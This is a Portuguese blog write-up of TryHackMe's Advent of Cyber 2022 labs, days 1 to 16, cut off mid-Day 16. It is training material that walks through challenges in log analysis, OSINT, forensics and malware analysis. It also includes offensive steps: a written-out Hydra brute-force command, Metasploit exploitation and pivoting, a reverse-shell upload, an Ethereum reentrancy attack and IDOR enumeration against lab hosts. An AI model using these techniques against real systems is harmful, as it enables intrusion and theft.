<!DOCTYPE html>
<html lang="pt" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>TryHackMe - Advent of Cyber 2022 | tomiodarim</title>
<meta name="keywords" content="write-up, tryhackme, aoc2022">
<meta name="description" content="Esse write-up será sobre sobre o Advent of Cyber 2022, que é o evento especial de natal do TryHackMe. Todos os dias a plataforma liberará algum desafio. Esse write-up só será publicado ao final do evento.
Nesse write-up não colocarei todo o conteúdo teórico apresentado nas Tasks, apenas um breve resumo e a explicação das questões. O evento pode ser acessado nesse link.
E antes de começar gostaria de agradecer ao TryHackMe e a todos os envolvidos no desenvolvimento do evento pelos ótimos desafios e por todo conteúdo que pude aprender ou revisar.">
<meta name="author" content="Lucas Tomio Darim">
<link rel="canonical" href="https://tomiodarim.io/posts/advent-of-cyber-2022/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.5a101feaed2bc000d60de8365173a1aa6c75665853dcc863f92f59ea5ace5d74.css" integrity="sha256-WhAf6u0rwADWDeg2UXOhqmx1ZlhT3Mhj&#43;S9Z6lrOXXQ=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.20cbcab8eadb4b1c256e6db331b0130fc305cd882d8b91865e9b6473e8ec5c24.js" integrity="sha256-IMvKuOrbSxwlbm2zMbATD8MFzYgti5GGXptkc&#43;jsXCQ="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://tomiodarim.io/images/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://tomiodarim.io/images/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://tomiodarim.io/images/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://tomiodarim.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://tomiodarim.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="TryHackMe - Advent of Cyber 2022" />
<meta property="og:description" content="Esse write-up será sobre sobre o Advent of Cyber 2022, que é o evento especial de natal do TryHackMe. Todos os dias a plataforma liberará algum desafio. Esse write-up só será publicado ao final do evento.
Nesse write-up não colocarei todo o conteúdo teórico apresentado nas Tasks, apenas um breve resumo e a explicação das questões. O evento pode ser acessado nesse link.
E antes de começar gostaria de agradecer ao TryHackMe e a todos os envolvidos no desenvolvimento do evento pelos ótimos desafios e por todo conteúdo que pude aprender ou revisar." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://tomiodarim.io/posts/advent-of-cyber-2022/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-12-25T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-12-25T00:00:00+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="TryHackMe - Advent of Cyber 2022"/>
<meta name="twitter:description" content="Esse write-up será sobre sobre o Advent of Cyber 2022, que é o evento especial de natal do TryHackMe. Todos os dias a plataforma liberará algum desafio. Esse write-up só será publicado ao final do evento.
Nesse write-up não colocarei todo o conteúdo teórico apresentado nas Tasks, apenas um breve resumo e a explicação das questões. O evento pode ser acessado nesse link.
E antes de começar gostaria de agradecer ao TryHackMe e a todos os envolvidos no desenvolvimento do evento pelos ótimos desafios e por todo conteúdo que pude aprender ou revisar."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://tomiodarim.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "TryHackMe - Advent of Cyber 2022",
      "item": "https://tomiodarim.io/posts/advent-of-cyber-2022/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "TryHackMe - Advent of Cyber 2022",
  "name": "TryHackMe - Advent of Cyber 2022",
  "description": "Esse write-up será sobre sobre o Advent of Cyber 2022, que é o evento especial de natal do TryHackMe. Todos os dias a plataforma liberará algum desafio. Esse write-up só será publicado ao final do evento.\nNesse write-up não colocarei todo o conteúdo teórico apresentado nas Tasks, apenas um breve resumo e a explicação das questões. O evento pode ser acessado nesse link.\nE antes de começar gostaria de agradecer ao TryHackMe e a todos os envolvidos no desenvolvimento do evento pelos ótimos desafios e por todo conteúdo que pude aprender ou revisar.",
  "keywords": [
    "write-up", "tryhackme", "aoc2022"
  ],
  "articleBody": "Esse write-up será sobre sobre o Advent of Cyber 2022, que é o evento especial de natal do TryHackMe. Todos os dias a plataforma liberará algum desafio. Esse write-up só será publicado ao final do evento.\nNesse write-up não colocarei todo o conteúdo teórico apresentado nas Tasks, apenas um breve resumo e a explicação das questões. O evento pode ser acessado nesse link.\nE antes de começar gostaria de agradecer ao TryHackMe e a todos os envolvidos no desenvolvimento do evento pelos ótimos desafios e por todo conteúdo que pude aprender ou revisar.\n[Day 1] Someone’s coming to town! Nesse primeiro dia é explicado sobre alguns frameworks de segurança cibernética, sendo eles o NIST, ISO 27000, MITRE ATT\u0026CK, Cyber Kill Chain e Unified Kill Chain. Há uma página que pode ser mostrada para encontrar as flags.\nApós clicar em start vamos para outra página com um quebra-cabeça, são ao todo 3 quebra-cabeças que podem ser resolvidos utilizando as dicas e o conhecimento sobre frameworks apresentado anteriormente, ou também é possível resolver pelo formato das peças.\nAo término dos 3, nos é mostrado uma página com uma flag e um culpado pelo ataque. Esse culpado está relacionado a história do evento deste ano.\nNa primeira questão é perguntado quem está atacando a rede do Papai Noel esse ano, e como podemos ver pela imagem acima da resolução dos quebra-cabeças a resposta é The Bandit Yeti.\nA segunda questão pede a flag, que é a também mostrada na imagem anterior, THM{IT’S A Y3T1 CHR1$TMA$}. Assim conclui-se o primeiro dia.\n[Day 2] Santa’s Naughty \u0026 Nice Log O conteúdo do segundo dia é relacionado a logs. É explicado um pouco o que são os logs, como são formados, onde são encontrados no Windows e no Linux. Além disso, também é explicado um pouco sobre o utilitário grep do Linux.\nHá uma máquina em anexo a Task de hoje que pode ser acessada no navegador. As questões são referentes ao conteúdo dessa máquina.\nA primeira questão é apenas ligar a máquina, que pode ser feito clicando no botão verde no início da Task. A segunda questão pede para usar o comando ls para saber quantos arquivos de log existem no diretório. Como pode ser visto na imagem abaixo o diretório possui apenas 2 arquivos de logs.\nA terceira questão pede qual o nome do arquivo que tem os logs do servidor web. Pelos arquivos encontrados anteriormente um deles tem o nome webserver.log que é a resposta dessa questão.\nA próxima questão pede em qual dia da semana a lista do Papai Noel foi roubada. Usando os comandos head e tail para ver, respectivamente, o início e fim do arquivo, é possível perceber que os logs são apenas do dia 18 de novembro. Então a lista foi roubada em uma sexta-feira, friday.\nAgora é pedido qual o IP dos atacantes. Ainda pelo retorno dos comando head e tail, todas as requisições são de um mesmo IP, 10.10.249.191.\nA sétima questão pede qual o nome da lista que foi roubada. Uma lista é provavelmente um arquivo de texto, logo terminaria com .txt. Então pode-se utilizar o regex \\.txt, para escapar o ‘.’ e buscar pelo literal .txt, assim casando com arquivos de texto. Portanto utilizando o grep com esse regex é possível achar uma requisição ao arquivo santaslist.txt, que é o arquivo que estávamos procurando.\nPor fim, a última questão pede para achar uma flag nos arquivos de log. As flags do TryHackMe possuem o formato THM{…}, então basta usarmos grep por THM nos arquivos de log. Assim encontramos a flag THM{STOLENSANTASLIST} no arquivo SSHD.log.\n[Day 3] Nothing escapes detective McRed O terceiro dia é focado em OSINT, que é a busca de informações de fontes abertas. Nessa Task é explicado o básico de OSINT através de google dorks, whois lookup, robots.txt e outros.\nA primeira questão pede pelo nome da registrar do domínio santagift.shop. Essa informação pode ser encontrada através do whois. Dessa forma ao pesquisar esse domínio no site who.is encontramos que o nome do registrar é NAMECHEAP INC.\nA próxima questão pede para encontrar uma flag em um código no github que contém credenciais sensíveis. Então pesquisando por “santagift.shop” nos códigos do github é encontra-se 3 códigos de uma conta chamada muhammadthm.\nE logo no início do config.php está a flag {THM_OSINT_WORKS}.\nCom a informação anterior podemos responder a terceira questão que pede qual arquivo contém senhas. É o arquivo config.php, o mesmo que tem a flag anterior.\nAs duas últimas questões pedem pelo nome do servidor QA associado ao site e a senha do servidor QA. Essas informações podem ser encontradas ainda no config.php, um pouco mais abaixo da flag anterior. Sendo o servidor qa.santagift.shop e a senha S@nta2022.\n[Day 4] Scanning through the snow No dia 4 é explicado sobre scanning, considerando network, port e vulnerability scanning e as ferramentas Nmap e Nikto.\nPara realizar as questões precisa-se ligar uma máquina alvo. As duas primeiras flags são relacionadas ao scan das portas na máquina. E as outras duas sobre o conteúdo do SMB da máquina.\nO nmap possui a opção -A para um scan que detecta o sistema operacional (OS), os software que estão rodando nas portas e roda os scripts padrão do Nmap Script Engine (NSE). E a opção -T4 para aumentar a velocidade do scan.\nPara o scan dessa máquina usei o comando nmap -A -T4 . Assim, descobri que o servidor do HTTP é o Apache e que na porta 22 está sendo rodado o SSH. Sendo essas as respostas para as duas primeiras perguntas.\nAgora, a partir das credenciais encontradas na Task de ontem, podemos conectar no servidor SMB e baixar os arquivos. Para listar os volumes que estão sendo compartilhados nesse servidor, eu utilize o comando smbclient seguido por -U para definir o usuário e senha e o -L para o host.\nEntão para acessar o volume utilizei o mesmo comando smbclient com o usuário e senha mas agora seguido pelo host e volume. Conectado no servidor, com o comando ls da para ver os arquivos e com get baixá-los.\nCom os arquivos localmente, é só usar o cat para mostrar o conteúdo. O arquivo flag.txt possui a flag {THM_SANTA_SMB_SERVER} resposta da terceira questão. E o arquivo userlist.txt possui alguns usuários e senhas, sendo santa25 a senha do usuário que pede na última questão.\n[Day 5] He knows when you’re awake No dia de hoje é explicado um pouco sobre serviços de acesso remoto, sendo estes SSH, RDP e VNC. E também sobre autenticação e ataques a senhas. Dessa forma as questões são relacionadas a fazer um brute-force em um servidor VNC.\nA primeira questão pede a senha do VNC da máquina anexada a essa Task. Para descobrir essa senha, fiz um brute-force utilizando o Hydra e a wordlist rockyou.txt. O comando que utilizei foi “hydra -P /usr/share/wordlists/rockyou.txt -t 48 vnc://10.10.44.200”, onde a opção -P é para selecionar a wordlist a ser usada, -t para aumentar o paralelismo assim acelerando a quantidade de tentativas e por fim o serviço e IP alvos.\nCom isso pode ser encontrado a senha 1q2w3e4r. E com ela deve-se conectar ao alvo para encontrar a flag da segunda questão. Então, a partir do remmina me conectei com a máquina. Assim, na imagem de fundo da área de trabalho está a flag THM{I_SEE_YOUR_SCREEN}.\n[Day 6] It’s beginning to look a lot like phishing No sexto dia, são explicados sobre email e os cabeçalhos que compõem estes, como From, To, SPF, MIME-Version, entre outros. É falado sobre as ferramentas emlAnalyzer para fazer análise de emails, emailrep para analisar a reputação do remetente e virustotal para identificar os links ou anexos que possam ter.\nPara responder a primeira questão é só abrir o arquivo do email com alguma ferramenta de edição de texto para vê-lo em plaintxt, eu utilizei o Sublime Text para isso. Logo nas primeiras linhas do arquivo, que são os campos de cabeçalho do email, já estão as respostas para as primeira 4 questões.\nA primeira e a terceira questão são respondidas utilizando o cabeçalho “From”, pois elas estão relacionadas a quem teria enviado o email. Onde Chief Elf é a resposta da terceira questão e o email chief.elf@santaclaus.thm da primeira.\nNo cabeçalho “Return-path” está a resposta para a questão 2, murphy.evident@bandityeti.thm, pois nessa questão é pedido qual o endereço de retorno.\nE a quarta questão, que pede qual o X-spam score, pode ser respondida utilizando o valor do cabeçalho X-Pm-SpamScore que é 3.\nAgora, é pedido o valor escondido no campo Message-ID. O valor deste cabeçalho está codificado em Base64, então para decodificar dá para utilizar a ferramenta CyberChef. Assim obtemos AoC2022_Email_Analysis.\nA questão 6 pede pela reputação de quem enviou o email. Para obter essa informação utiliza-se a ferramenta Simple Email Reputation que foi apresentada anteriormente nessa Task. Sendo que é só inserir o email que se deseja analisar no site que é retornado a reputação, no caso desse email é RISKY.\nAs próximas questões são relacionadas ao anexo do email, para obtê-lo usei o comando emlAnalyzer com as opções -i para passar o caminho do arquivo e –extract-all para extrair o anexo. Com o anexo podemos ler o nome dele Division_of_labour-Load_share_plan.doc, que é a resposta da sétima questão. E usar o comando sha256sum para conseguir o hash, respondendo a oitava questão, 0827bb9a2e7c0628b82256759f0f888ca1abd6a2d903acdb8e44aca6a1a03467.\nAs duas últimas questões ainda são baseadas no anexo, mas agora só vai ser necessário o hash dele. A questão 9 pede qual é a segunda tática do Mitre ATT\u0026CK associada a esse arquivo pelo Virus Total. Desse modo ao inserir o hash no Virus Total e ir na aba BEHAVIOUR, encontra-se 3 táticas do ATT\u0026CK, sendo a resposta Defense Evasion.\nPor fim, para a última questão pede pela subcategoria do arquivo informada pelo InQuest. Ao acessar o site e buscar pelo hash encontramos que a subcategoria é macro_hunter.\n[Day 7] Maldocs roasting on an open fire O dia 7 é sobre o CyberChef e como ele pode ser usado para encontrar URLs em arquivos, aqui está usando o arquivo encontrado na Task de ontem para fazer essa análise. O texto da própria task já é um passo a passo para a resolução das questões.\nPara essa task vamos utilizar a máquina virtual anexada, também será utilizado o CyberChef que está salvo nos favoritos do browser da máquina. Após ligar a máquina é só abrir o Firefox e CyberChef que está nos favoritos, então carregar o arquivo .doc que está na área de trabalho e inserir a receita mostrada nessa Task.\nAo inserir todas as operações mostradas a receita deve ficar a seguinte:\nO operador Strings busca por sequências de caracteres imprimíveis baseado na tabela ASCII e colocamos um limitador de 258 caracteres. O primeiro Find/Replace busca e remove o regex [\\[\\]_\\n], ou seja os caracteres [, ], _ e quebra de linha. Ao fazer essas operações obtemos alguns comandos de powershell seguidos por algo codificado em Base64.Assim, é usado o Drop Bytes para remover os primeiros caracteres, restando apenas o Base64.\nEntão com o operador Decobe base64 decodificamos o texto. Porém o powershell utiliza codificação dos caracteres como Unicode UTF-16LE, por isso precisamos utilizar o operador Decode text escolhendo o padrão UTF-16LE (1200).Agora é utilizado Find/Replace de novo para excluir os caracteres ‘, (, ), +, ‘, ` e “. E mais uma vez o Find/Replace para substituir ]b2H_ por http.\nAgora podemos finalmente utilizar o operador Extract URLs para obter as URLs do documento. Mas elas aparecem em uma linha só separadas por @, com o Split podemos separá-las por linhas. E por fim o Defang URL adiciona [] em cada. para que esses links não possam ser clicados. Dessa forma conseguimos as seguintes URLs:\nCom as URLs, agora é possível responder às questões. A primeira pede qual a versão do CyberChef naquela máquina, a resposta pode ser encontrada no canto superior esquerdo ou na URL do site, 9.49.0.\nA próxima questão pede quantas operações foram usadas para extrair as URLs, contando podemos ver que foram 10.\nA questão 3 pede qual o nome do malware que uma das URLs tentava baixar. A primeira é a única que indica um arquivo executável, logo o malware é mysterygift.exe.\nNa quarta questão é pedido qual a última URL encontrada, a resposta é hxxps[://]cdn[.]bandityeti[.]THM/files/index/. E a última questão pede por um ticket em uma das URLs. Na penúltima URL encontramos um diretório Goldenticket seguido por THM_MYSTERY_FLAG, que é o ticket.\n[Day 8] Last Christmas I gave you my ETH Assim como no dia de ontem, hoje a parte teórica da Task contém um passo a passo para resolver a questão. Mas agora o conteúdo é sobre smart contracts, é explicado o que são esses contratos e como podem ser atacados.\nA primeira questão não precisa de resposta pois só pede para baixar o zip anexado na Task e abrir o Remix. Agora para a segunda flag iremos fazer o deploy do contrato EtherStore.sol que veio no zip e atacá-lo com o outro contrato Attack.sol.\nPara começar precisamos adicionar os dois contratos ao workspace do remix, isso pode ser feito clicando no botão que tem uma seta para cima e selecionando os arquivos.\nAgora, para que esses contratos possam ser utilizados, eles precisam ser compilados, o que pode ser feito na aba “Solidity compiler”. Para esses contratos vamos utilizar o compilador 0.8.10, com esse compilador selecionado é só escolher o contrato e compilá-lo clicando em “Compile ”.\nCom os dois compilados agora podemos ir para a próxima aba, “Deploy \u0026 run transactions”. Agora vamos selecionar o EtherStore.sol e clicar em “Deploy”, isso criará um novo menu mais abaixo onde poderemos adicionar e remover alguns valores de uma carteira. Para adicionar algum valor é só selecionar o valor em “VALUE” e clicar em “deposit” do novo menu.\nEntão podemos fazer o ataque a esse contrato, para isso selecionaremos o contrato Attack e do lado de “Deploy” precisaremos inserir o endereço do contrato que vamos atacar. Como no anterior isso criará um novo menu mais abaixo.\nPor fim, para realizar o ataque, o EtherStore precisa ter algum saldo e devemos inserir um valor menor que esse saldo em “VALUE” e clicar em “attack” do novo menu. Com isso feito a flag flag{411_ur_37h_15_m1n3} será impressa no terminal ao lado, sendo essa a resposta da segunda questão.\n[Day 9] Dock the halls Hoje o tema da Task é Pivoting, nela é explicado o básico sobre Pivoting e como usar o Metasploit. E como nos dias anteriores tem um passo a passo para a resolução das questões.\nA primeira questão pede por qual porta está aberta na máquina alvo. Utilizando o nmap com as mesmas opções que usei e expliquei no dia 4, é retornado que a porta 80 está aberta com um servidor web Apache.\nA próxima questão pede qual o framework usado pela aplicação web. Ao acessar a página, no canto inferior esquerdo, está escrito o Laravel v8.26.1, que é o framework e sua versão.\nAo pesquisar por essa versão do laravel no google, encontrei o CVE-2021-3129. Que é a resposta da terceira questão que pede por esse CVE.\nAs três questões seguintes estão relacionadas ao que foi explicado no texto da Task. Sendo sessions -u-1 usado para melhorar a última sessão em uma shell de Meterpreter, /.dockerenv o diretório que indica ser um Docker e .env o arquivo que contém credenciais, esse arquivo fica no cat /var/www/.\nPara exploitar a aplicação web utilizei o módulo multi/php/ignition_laravel_debug_rce do Metasploit, configurando apenas os parâmetros rhost com o IP do alvo e lhost o IP da minha máquina.\nA questão 7 pede pelo banco de dados que tem informações úteis. Na shell do meterpreter pode ser utilizado o comando “resolve webservice_database” para obter o IP do banco de dados que está sendo utilizado pela aplicação web. Porém é um IP privado que não temos acesso a partir da nossa máquina, então precisa usar as técnicas de pivoting explicadas antes.\nPara realizar o pivoting vamos utilizar os seguintes comando no metasploit “route add 172.28.101.51/32 -1” e “route add 172.17.0.1/32 -1” que permitirão, respectivamente, enviarmos pacotes para a rede interna dos dockers e a rede do docker com o host.\nAgora, na mesma rede, podemos obter as informações do banco de dados com a ajuda de um módulo de scan do metasploit. Ao executá-lo encontramos a tabela users que a questão pedia.\nTendo o nome da tabela, podemos utilizar comando de SQL com outro módulo para ler os dados armazenados nela. Dessa forma obtendo um usuário e senha, p4$$w0rd.\nEntão para tunelar os pacotes de outros aplicativos além do metasploit da nossa máquina para dentro da rede que comprometemos, usaremos um proxy socks4. Para configurá-lo estaremos usando mais um módulo do metasploit, dessa vez o server/socks_proxy com os parâmetros srvhost=127.0.0.1, srvport=9050 e version=4a. Com isso todo pacote que enviarmos para a máquina nessa porta será redirecionado para a outra rede. Essa porta e versão do socks é a padrão do proxychains, então se quiser utilizar outra precisa também alterar o arquivo /etc/proxychains4.conf.\nAssim com o proxychains podemos utilizar o nmap para ver as portas abertas na máquina que esteja hospedando os dockers. E descobrimos que possui as portas 22 e 80 abertas.\nPara terminar, conectei nessa máquina através do ssh com as credenciais que estavam no banco de dados. O usuário santa já é o root da máquina e ao conectar já temos a flag root.txt, THM{47C61A0FA8738BA77308A8A600F88E4B}.\n[Day 10] You’re a mean one, Mr. Yeti No décimo dia, é explicado como hackear jogos de browser a partir da alteração da memória RAM. Para isso tem um plugin para o browser Cetus que pode analisar e alterar o valor dos dados armazenados na memória do Web Assembly.\nA máquina que está anexada a essa Task possui um jogo de browser rodando e também já vem com o Cetus instalado. Para conseguir as duas flag basta completar dois desafios no jogo. O primeiro desafio é acertar um número aleatório para o guarda e o segundo é não morrer ao passar por algo que causa dano.\nNo primeiro desafio, após errar o número o guarda informa qual era o número esperado. Então podemos utilizar o Cetus para buscar na memória por esse número e saber onde que ele fica armazenado. Como estamos buscando pelo número exato, utilizamos o operador EQ e pelo tamanho limite podemos imaginar que é um inteiro de 32 bits, logo usaremos o tipo i32.\nCom essa busca é encontrado apenas um endereço de memória que é o que contém o número que buscamos, o valor está em hexadecimal. Clicando no botão azul do lado direito podemos salvar esse endereço para acompanhar as mudanças nele.\nAo conversar com o guarda novamente o valor armazenado no endereço muda. E com alguma ferramenta de conversão de hexa para decimal podemos obter a senha.\nAssim ao informar o valor certo para o guarda nos é dada a primeira flag, THM{5_star_Fl4gzzz}, e porta atrás se abre permitindo que acessemos outra área do jogo.\nAgora temos que passar por uma ponte onde estão sendo jogadas bolas de neve que ao acertarem o personagem ele perde vida. Para passarmos por isso precisamos encontrar o endereço de memória que armazena a vida e garantirmos que ele não diminua.\nPrimeiro teremos que fazer uma pesquisa pela memória com o operador EQ e o campo valor vazio, para obtermos todos os endereços. Então deixamos o personagem perder um pouco de vida com as bolas de neve e fazemos uma busca novamente mas com o operador LT, dessa forma poderemos ver quais os endereços que tiveram o valor reduzido desde a busca anterior.\nCom isso encontrei um endereço que possui valor 70 que é mais ou menos o quanto da barra de vida ainda está verde, então salvo esse endereço nos “Bookmarks” como no desafio anterior. Com isso na aba “Bookmarks” podemos selecionar a opção “Freeze” para impedir que o valor mude, dessa forma o personagem não perderá vida ou morrerá ao atravessar.\nPor fim para conseguir a segunda flag é só falar com o Bandit Yeti, THM{yetiyetiyetiflagflagflag}.\n[Day 11] Not all gifts are nice Nessa Task é explicado sobre Memory Forensics, ou seja como analisar o conteúdo da memória RAM de um computador. Isso pode ser realizado com o uso do software volatility, que consegue analisar dumps de Windows, Linux e Mac.\nPara responder às questões será utilizado a máquina anexada a essa Task que já possui o volatilty e um dump chamado workstation.vmem.\nA primeira questão pede pela versão do Windows que foi capturado a imagem da memória. Para obter essa informação usaremos o volatility passando como argumento a imagem da memória e a opção windwos.info. Com isso obtemos que a versão é a 10.\nAs próximas duas questões são relacionadas a um processo que estava rodando na máquina, é perguntado qual o nome do processo/presente que o papai noel deixou e qual o Process ID (PID) dele. Alterando o comando anterior de windows.info para windows.pslist podemos obter uma lista com todos os processos que estavam sendo executados. Ao final dessa lista de encontrá-se o mysterygift.ex com o PID 2040.\nE para a última questão é pedido quantos arquivos podem ser obtidos desse processo. Alterando o plugin novamente, agora para windows.dumpfiles, e utilizando o argumento –PID 2040 para filtrar os processos, podemos obter os arquivos relacionados ao processo da questão anterior. Assim obtemos 16 arquivos.\n[Day 12] Forensic McBlue to the REVscue! No dia 12 é explicado sobre anlise de malware, tanto estática sem executar o código malicioso como dinâmica executando o código. O código que vai ser analisado hoje é o processo que foi encontrado ontem durante a análise da memória.\nAs duas primeiras questões podem ser respondidas utilizando o software “Detect It Easy” para examinar o mysterygift. A primeira questão pede pela arquitetura, que é 64-bit. E a segunda pelo packer que foi utilizado para esconder o malware, sendo a resposta UPX.\nA última questão também pode ser feita utilizando esse software, com a aba de “Strings”. Nessa questão é pedido pela URL que o malware utiliza para baixar um arquivo. Filtrando por http:// encontramos a URL http://bestfestivalcompany.thm/favicon.ico.\nAs questões 3 e 4 pedem pelo compilador que foi utilizado para compilar esse código e quantas técnicas de Discovery do ATT\u0026CK são utilizadas por ele. Para respondê-la utilizaremos o comando CAPA, mas antes precisa-se desempacotar o arquivo utilizando o UPX.\nAo utilizar esses dois comandos obtemos várias informações relacionadas ao malware. Sendo que ele utiliza 5 técnicas do Mitre ATT\u0026CK, mas apenas 2 de Discovery. E que foi utilizado o compilador Nim.\nPara as próximas questões será feita uma análise dinâmica, então executaremos o código enquanto o Process Monitor acompanha o que está sendo executado no computador.\nPrimeiro é pedido qual chave de registro que é abusada pelo malware. Ao filtrar pelas atividades relacionadas a registro e apagar as opções que não são “RegCreatekey”, encontramos que está sendo alterada a chave HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. E o valor escrito nessa chave é C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\wishes.bat, sendo essa a resposta para a questão seguinte.\nA questão 7 quer saber quais arquivos estão sendo criados pelo malware. Então agora devemos filtrar por atividade de sistema de arquivos. Assim encontramos que está sendo criado dois arquivos, o test.jpg e o wishes.bat.\nA oitava questão pede por quais domínios o malware está se conectando. Ao filtrar por atividade de rede aparece o bestfestivalcompany.thm e o virustotal.com.\n[Day 13] Simply having a wonderful pcap time Tendo passado da metade do evento, hoje estamos no dia 13. Aqui é explicado sobre análise de pacotes. Pacotes são uma estrutura de dados utilizada para a transmissão de informações entre os computadores, eles possuem um cabeçalho com as informações de origem, destino, detecção de erros, entre outros. E também um campo de payload onde é inserido os dados que se deseja enviar. A partir da análise de pacotes é possível detectar intrusões na rede.\nA questão 1 pede pela porcentagem de pacotes de HTTP. Para obter esse dado utilizaremos o “Protocol Hierarchy” que está no menu Statistics, com isso obtemos a quantidade e porcentagem de pacotes de cada protocolo da nossa captura. Para HTTP foram apenas 0.3 dos pacotes.\nAs duas questões seguintes pedem por qual porta recebeu mais de mil pacotes e qual é o serviço associado a essa porta. Esse dado pode ser encontrado na seção “TCP” do “Conversations”, que também está no menu Statistics. Podemos ver que das três portas apenas a 3389 recebeu mais de mil pacotes. Essa porta é normalmente utilizada para o Remote Desktop Protocol, RDP.\nA quarta questão pede pelos domínios que foram pesquisados no DNS. Para filtrar apenas os pacotes referentes a pesquisas de DNS, basta colocar DNS no filtro acima dos pacotes. Com isso obtemos duas pesquisas e duas respostas do DNS para os domínios bestfestivalcompany[.]thm,cdn[.]bandityeti[.]thm.\nAssim como na questão anterior usaremos o filtro mas agora para buscar por pacotes HTTP. A questão pede por quais arquivos foram requisitados utilizando HTTP. Podemos ver que foi feito um GET para favicon[.]ico,mysterygift[.]exe.\nAo clicar em um dos pacotes, logo abaixo aparece mais detalhes do pacotes e clicando para abrir os sub-menus podemos ver todos os dados contidos nele. As próximas duas questões pedem pelo IP que baixou o mysterygift.exe e de qual domínio foi baixado. Olhando as informações do pacote 351, encontramos que o IP de origem foi 10[.]10[.]29[.]189 e foi requisitado do site cdn[.]bandityeti[.]thm.\nAo fazer o mesmo com o pacote 744, que foi o que requisitou o ícone, podemos ver o user-agent que é pedido pela questão oito. Sendo que o user-agent é Nim httpclient/1.6.8.\nPara responder a nona questão antes precisaremos baixar localmente o mysterygift.exe. Para baixá-lo tem que ir no menu “File”, então em “Export Objects” e “HTTP”, por fim escolher o arquivo. Com o arquivo salvo podemos utilizar no terminal o comando sha256sum para obtermos o hash dele, 0ce160a54d10f8e81448d0360af5c2948ff6a4dbb493fe4be756fc3e2c3f900f.\nA última questão pede para buscar, no Virus Total, pelos IPs aos quais esse malware se conecta. Ao pesquisar pelo hash no Virus Total e ir na aba “Behaviour”, aparecem os seguintes IPs. Porém para responder a questão é apenas os de TCP e não precisa da porta, então fica 20[.]99[.]133[.]109,20[.]99[.]184[.]37,23[.]216[.]147[.]64,23[.]216[.]147[.]76 como resposta.\n[Day 14] I’m dreaming of secure web apps Seguindo para o décimo quarto dia, é explicado sobre IDOR em aplicações web. IDOR acontece quando o adversário é capaz de manipular algum parâmetro e não há nenhum controle de acesso para impedi-lo.\nPara as questões de hoje vamos entrar na aplicação a partir da conta do Elf McSkidy e buscar por dados de outro elfo e de outra imagem.\nA primeira questão pede pelo número do escritório do Elf Pivot McRed. Ao logar na aplicação entramos como McSkidy com a URL “/users/101.html”, se mudarmos o 101 para outros números podemos acessar os dados dos outros elfos. Assim no 105 encontramos o elfo que precisamos para essa questão, sendo que seu escritório possui o número 135.\nA próxima questão pede por uma flag que está em uma imagem. Ao ler o código-fonte da página pode-se perceber que as imagens dos perfis são armazenadas em “/images/.png”.\nEntão variando o número do mesmo jeito que fizemos para encontrar o elfo, conseguimos encontrar a imagem que contém a flag THM{CLOSE_THE_DOOR}.\n[Day 15] Santa is looking for a Sidekick O Task de hoje, dia 15, é focado em validação de entrada do usuário para desenvolvimento seguro. Entradas que não são validadas podem conter arquivos com formatos diferentes do que é esperado pela aplicação ou arquivos maliciosos, assim permitindo um Remote Code Execution (RCE).\nA primeira questão pede por qual o nome dado a forma de inserir arquivos que permite ao adversário inserir qualquer arquivo. A resposta para essa questão está logo no início da parte teórica e é Unrestricted. Porque uma vez que não tem validação não tem como restringir os arquivos.\nA questão 2 pede pelo nome da aplicação web. Ao acessar o IP na máquina anexada no browser encontramos a página SantaSideKick2.\nA próxima questão pede por uma flag que está armazenada na pasta de documentos do HR_Elf. Para obter essa flag primeiro precisamos conseguir uma shell. A máquina alvo é um Windows, então vamos criar uma shell reversa com o msfvenom com o formato exe e payload para Windows.\nEntão configurar os parâmetros do multi/hander para escutar a shell.\nCom a listener pronto, podemos fazer o upload da Shell na aplicação web.\nApós alguns segundos obtemos uma sessão do meterpreter. Então navegando até a pasta Documents do usuário HR_Elf encontramos a flag, THM{Naughty.File.Uploads.Can.Get.You.RCE}.\nAs próximas questões agora são mais teóricas referentes à validação de entrada. A técnica para assegurar que um tipo específico de arquivos foi inserido, a resposta é File Extension Validation. A técnica para garantir que o adversário não possa acessar o arquivo que ele fez o upload é File Renaming. E por último a técnica para ter certeza que o arquivo não é malicioso é Malware Scanning.\n[Day 16] SQLi’s the king, the carolers sing O conteúdo de hoje é desenvolvimento seguro, assim como ontem, mas agora para defender de ataques de SQL injection. Esse tipo de ataque acontece quando os parâmetros que formam uma pesquisa SQL não são validados, assim permitindo que o adversário os altere. Isso pode levar a um bypass dos mecanismos de 